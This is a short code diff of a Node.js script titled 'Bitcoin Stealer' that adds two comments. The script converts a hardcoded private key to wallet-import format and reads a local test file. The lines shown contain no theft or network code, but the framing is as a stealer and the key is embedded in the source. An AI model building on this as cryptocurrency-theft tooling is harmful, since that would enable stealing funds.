@@ -2,10 +2,10 @@ process.title = "Testing: Bitcoin Stealer by Michal2SAB";
 
 var CoinKey = require('coinkey');
 const fs = require('fs');
-
+// get the key
 var privateKeyHex = "1184CD2CDD640CA42CFC3A091C51D549B2F016D454B2774019C2B2D2E08529FD";
 const data = fs.readFileSync('./test.txt');
-
+// warn us, save it in a test file and quit the tool
 var ck = new CoinKey(Buffer.from(privateKeyHex, 'hex'));
 ck.compressed = false;
 console.log(ck.privateWif);
